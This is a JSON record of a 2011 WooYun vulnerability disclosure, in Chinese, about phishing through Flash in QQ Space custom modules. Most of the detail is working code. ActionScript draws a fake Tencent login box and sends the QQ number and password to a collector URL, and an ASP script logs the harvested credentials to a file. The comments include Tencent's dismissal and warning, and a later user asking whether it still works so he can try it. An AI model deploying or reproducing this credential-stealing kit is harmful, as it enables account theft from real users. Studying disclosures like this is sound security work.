{"id": 22503, "wybug_id": "wooyun-2011-02532", "wybug_title": "QQ空间flash钓鱼", "wybug_corp": "腾讯", "wybug_author": "only_guest", "wybug_date": "2011-07-19 23:12", "wybug_open_date": "2011-07-20 08:56", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["钓鱼欺诈", "利用技巧", "钓鱼风险"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-07-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-07-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 危害比较严重,今晚一无聊人事来社工我的时候发现的.可以钓鱼得到对方帐号密码. 详细说明：  QQ空间自定义模块,插入一个flash,flash做一个仿腾讯的登录框.flash里写如下动作\nvar str = \"http://localhost/mail.asp\";ntxt.restrict = \"0-9\";var scData = new LoadVars();scData.onLoad = function (success){    if (!success)    {        msg.text = \"错误：用户密码错误！\";    }    else    {        msg.text = \"错误：用户密码错误！\";    } // end else if    gotoAndStop(4);};sub_btn.onRelease = function (){    var _loc1 = ntxt.text;    var _loc2 = ptxt.text;    if (_loc2.length > 5 && _loc1.length > 4)    {        scData.QQNumber = _loc1;        scData.QQPassWord = _loc2;        scData.sendAndLoad(str, scData, \"get\");    } // end if    if (_loc2.length < 6 || _loc1.length < 5)    {        ntxt.text = \"\";        ptxt.text = \"\";    } // end if};stop ();\nmail.asp里写收信代码\n<%strLogFile=\"testqqhahaha.txt\"QQNumber=request(\"QQNumber\")QQPassWord=request(\"QQPassWord\")if QQNumber=\"\" or QQPassWord=\"\" then   response.write \"哈哈哈哈\"   response.endEnd IfStrLogText=StrLogText&QQNumber&\"----\"&QQPassWordStrLogText=StrLogText&\"----\"&date&\" \"&timeset f=Server.CreateObject(\"scripting.filesystemobject\")set ff=f.opentextfile(server.mappath(\".\")&\"\\\"&strLogFile,8,true,0)ff.writeline(StrLogText)ff.closeset ff=nothingset f=nothingresponse.write \"嘿嘿嘿嘿!\"%>\n   漏洞证明：  http://user.qzone.qq.com/5447055提交了,俺就收到了...我只是为了提交漏洞做的演示,腾讯官方可别给俺QQ封了...   修复方案：  你们比我专业...   版权声明：转载请注明来源 only_guest@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2011-07-20 08:56 厂商回复： 添加对漏洞的补充说明以及做出评价的理由 漏洞Rank：2  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-07-20 08:57 |    \t\t腾讯(乌云厂商)\t\t \n  你的空间速度去掉欺诈flash，否则会被封    \n     2011-07-20 14:51 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  去掉了.纠结啊.....还好我看到的早...腾讯牛啊...不带这么玩的...    \n     2011-07-20 15:38 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  哦`才发现原来我发晚了...呵呵....    \n     2013-06-14 20:22 |    \t\t噬魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:37        | 08安全团队)\t\t \n  还能用么？我试试去    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}